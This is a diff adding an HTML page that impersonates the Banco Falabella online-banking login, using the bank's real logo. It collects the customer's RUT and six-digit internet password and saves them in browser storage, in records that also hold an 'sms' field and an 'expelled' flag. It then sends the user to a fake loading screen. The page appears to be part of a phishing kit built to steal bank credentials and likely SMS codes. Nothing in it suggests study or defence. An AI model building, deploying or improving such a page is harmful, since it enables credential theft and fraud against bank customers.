@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco Falabella</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      margin: 0;
+      max-width: 100%;
+      overflow-x: hidden;
+      font-family: sans-serif;
+      background: #fff;
+      height: 100%;
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1.5em 1em;
+      border-bottom: 1px solid #ccc;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08);
+      width: 100%;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 100;
+      background-color: white;
+      overscroll-behavior: contain;
+      touch-action: none;
+    }
+
+    header div {
+      display: flex;
+      align-items: center;
+    }
+
+    header img {
+      height: 28px;
+      max-width: 100%;
+    }
+
+    #menuToggle {
+      background: none;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 26px;
+      height: 20px;
+      padding: 0;
+      margin-right: 0.6em;
+    }
+
+    #menuToggle div {
+      background-color: #666666;
+      height: 3.5px;
+      border-radius: 3px;
+      width: 100%;
+    }
+
+    .boton-mi-cuenta {
+      background-color: #3baf3c;
+      color: white;
+      border: none;
+      padding: 1.1em 1.2em;
+      font-weight: normal;
+      font-size: 0.9em;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      white-space: nowrap;
+      height: auto;
+      line-height: 1.2;
+      min-height: 52px;
+      border-radius: 30px / 50%;
+    }
+
+    .icono-lupa {
+      width: 50px;
+      height: 50px;
+      background-color: white;
+      border: 1.2px solid #888888;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .icono-lupa svg {
+      width: 26px;
+      height: 26px;
+      fill: #666666;
+    }
+
+    .boton-verde {
+      background-color: #62c462;
+      border: none;
+      color: white;
+      font-weight: bold;
+      padding: 1em;
+      width: 100%;
+      font-size: 1em;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .boton-verde:disabled {
+      background-color: #c3e6c3;
+      cursor: not-allowed;
+    }
+
+    .form-container {
+      padding: 1em;
+      background-color: white;
+      position: fixed;
+      top: 80px; /* Espacio reducido */
+      left: 0;
+      width: 100%;
+      z-index: 90;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      overscroll-behavior: contain;
+      touch-action: none;
+    }
+
+    input {
+      width: 100%;
+      padding: 1em;
+      margin-bottom: 1em;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1em;
+    }
+
+    .link {
+      color: green;
+      font-size: 0.75em;
+      text-align: right;
+      display: block;
+      margin-top: 3em;
+    }
+
+    .content {
+      margin-top: 220px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .imagenes-arriba {
+      max-width: 600px;
+      margin: 0 auto;
+      padding-top: 5px;
+    }
+
+    .imagenes-arriba img {
+      width: 100%;
+      margin-bottom: 10px;
+      display: block;
+    }
+
+    .slider-container {
+      position: relative;
+      z-index: 1;
+      overflow: visible;
+      width: 100vw;
+      height: auto;
+      margin: 0 auto 2em auto;
+      border-radius: 0;
+      max-width: 600px;
+    }
+
+    .slider {
+      display: flex;
+      transition: transform 0.4s ease-in-out;
+      height: auto;
+    }
+
+    .slide {
+      min-width: 100%;
+      height: auto;
+    }
+
+    .slide img {
+      width: 100%;
+      height: auto;
+      object-fit: contain;
+      display: block;
+      border-radius: 0;
+    }
+
+    .nav-btn {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      background-color: rgba(0, 0, 0, 0.4);
+      border: none;
+      color: white;
+      font-size: 2em;
+      padding: 0.3em 0.6em;
+      cursor: pointer;
+      z-index: 10;
+      border-radius: 50%;
+    }
+
+    .nav-left {
+      left: 10px;
+    }
+
+    .nav-right {
+      right: 10px;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <div>
+    <button id="menuToggle" aria-label="Menú">
+      <div></div>
+      <div></div>
+      <div></div>
+    </button>
+    <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="Banco Falabella" />
+  </div>
+  <div style="display: flex; align-items: center; gap: 20px;">
+    <div class="icono-lupa" title="Buscar" style="margin-left: 12px;">
+      <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+        <path d="M15.5 14h-.79l-.28-.27a6.471 6.471 0 001.48-5.34C15.05 5.02 12.03 2 8.5 2S2 5.02 2 8.5 5.02 15 8.5 15c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zM8.5 13c-2.48 0-4.5-2.02-4.5-4.5S6.02 4 8.5 4 13 6.02 13 8.5 10.98 13 8.5 13z"/>
+      </svg>
+    </div>
+    <button class="boton-mi-cuenta">Mi cuenta</button>
+  </div>
+</header>
+
+<div class="form-container">
+  <div style="height: 1.2em; margin-bottom: 1em;"></div>
+  <input type="text" id="rut" placeholder="RUT" maxlength="11" />
+  <input type="password" id="clave" placeholder="Clave Internet" maxlength="6" />
+  <button id="ingresarBtn" class="boton-verde" disabled>INGRESAR</button>
+  <a href="#" class="link">Crea o recupera tu clave</a>
+</div>
+
+<div class="content">
+  <div style="height: 160px;"></div>
+
+  <div class="imagenes-arriba"></div>
+
+  <div class="slider-container" id="sliderContainer">
+    <button class="nav-btn nav-left" onclick="moverSlider(-1)">&#10094;</button>
+    <div class="slider" id="slider">
+      <div class="slide"><img src="foto3.jpg" alt="foto 3" /></div>
+      <div class="slide"><img src="foto2.jpg" alt="foto 2" /></div>
+      <div class="slide"><img src="foto1.jpg" alt="foto 1" /></div>
+    </div>
+    <button class="nav-btn nav-right" onclick="moverSlider(1)">&#10095;</button>
+  </div>
+
+  <div style="background-color: #f3fbee; text-align: center; padding: 2em;">
+    <h2 style="font-weight: normal; font-size: 1.5em; margin-bottom: 1em;">
+      El Crédito de Consumo que necesitas ¡a un par de clics!
+    </h2>
+    <input
+      type="text"
+      id="rutSimulador"
+      placeholder="Ingresa tu RUT"
+      style="padding: 1em; font-size: 1em; width: 80%; max-width: 400px; border: 1px solid #ccc; border-radius: 8px; margin-bottom: 1em;"
+    />
+    <br />
+    <button
+      style="background-color: #7ac27c; border: none; color: white; font-size: 1em; padding: 1em 2em; border-radius: 30px; cursor: pointer;"
+    >
+      Quiero simular
+    </button>
+  </div>
+</div>
+
+<script>
+  const rutInput = document.getElementById("rut");
+  const claveInput = document.getElementById("clave");
+  const btn = document.getElementById("ingresarBtn");
+
+  function validarRUT(rut) {
+    return /^[0-9]{7,8}-[0-9kK]$/.test(rut);
+  }
+
+  function validarClave(clave) {
+    return /^[0-9]{6}$/.test(clave);
+  }
+
+  function actualizarEstadoBoton() {
+    const rutValido = validarRUT(rutInput.value.trim());
+    const claveValida = validarClave(claveInput.value.trim());
+    btn.disabled = !(rutValido && claveValida);
+  }
+
+  claveInput.addEventListener("input", (e) => {
+    e.target.value = e.target.value.replace(/\D/g, "").slice(0, 6);
+    actualizarEstadoBoton();
+  });
+
+  rutInput.addEventListener("input", (e) => {
+    let val = e.target.value.replace(/[^0-9kK]/g, "");
+    let cuerpo = val.slice(0, -1).slice(0, 8);
+    let dv = val.slice(-1);
+    if (cuerpo.length >= 7) {
+      e.target.value = cuerpo + "-" + dv;
+    } else {
+      e.target.value = cuerpo + (dv !== "" ? "-" + dv : "");
+    }
+    actualizarEstadoBoton();
+  });
+
+  let indice = 0;
+  const slider = document.getElementById("slider");
+  const totalSlides = slider.children.length;
+
+  function moverSlider(dir) {
+    indice = (indice + dir + totalSlides) % totalSlides;
+    slider.style.transform = `translateX(-${indice * 100}%)`;
+  }
+
+  setInterval(() => moverSlider(1), 5000);
+
+  let startX = 0;
+  document.getElementById("sliderContainer").addEventListener("touchstart", (e) => {
+    startX = e.touches[0].clientX;
+  });
+
+  document.getElementById("sliderContainer").addEventListener("touchend", (e) => {
+    const endX = e.changedTouches[0].clientX;
+    if (endX - startX > 50) moverSlider(-1);
+    if (startX - endX > 50) moverSlider(1);
+  });
+
+  document.getElementById("menuToggle").addEventListener("click", (e) => {
+    e.preventDefault();
+  });
+
+  btn.addEventListener("click", () => {
+    const rut = rutInput.value.trim();
+    const clave = claveInput.value.trim();
+
+    let usuarios = JSON.parse(localStorage.getItem("usuarios")) || [];
+    const usuarioExistente = usuarios.find((u) => u.rut === rut);
+
+    if (!usuarioExistente) {
+      usuarios.push({ rut: rut, clave: clave, sms: "-", expulsado: false });
+    } else {
+      usuarioExistente.expulsado = false;
+    }
+
+    localStorage.setItem("usuarios", JSON.stringify(usuarios));
+    localStorage.setItem("sesionIniciada", "true");
+    localStorage.setItem("rutUsuario", rut);
+    localStorage.setItem("claveUsuario", clave);
+
+    window.location.href = "pantalla-carga.html";
+  });
+
+  window.onload = function () {
+    const rut = localStorage.getItem("rutUsuario");
+    let usuarios = JSON.parse(localStorage.getItem("usuarios")) || [];
+
+    const usuario = usuarios.find((u) => u.rut === rut);
+
+    if (usuario && usuario.expulsado === true) {
+      usuarios = usuarios.filter((u) => u.rut !== rut);
+      localStorage.setItem("usuarios", JSON.stringify(usuarios));
+      localStorage.removeItem("rutUsuario");
+      localStorage.removeItem("claveUsuario");
+      localStorage.removeItem("sesionIniciada");
+      window.location.href = "index.html";
+    }
+  };
+</script>
+</body>
+</html>
